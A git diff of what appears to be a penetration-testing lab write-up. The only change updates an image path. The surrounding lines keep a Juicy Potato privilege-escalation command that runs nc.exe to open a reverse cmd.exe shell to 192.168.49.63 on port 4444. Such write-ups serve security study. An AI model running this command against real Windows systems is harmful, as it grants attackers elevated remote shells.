@@ -76,4 +76,4 @@ So i download juicy potato 32 bit and netcat:
 C:\Temp>.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c c:\Temp\nc.exe -e cmd.exe 192.168.49.63 4444" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
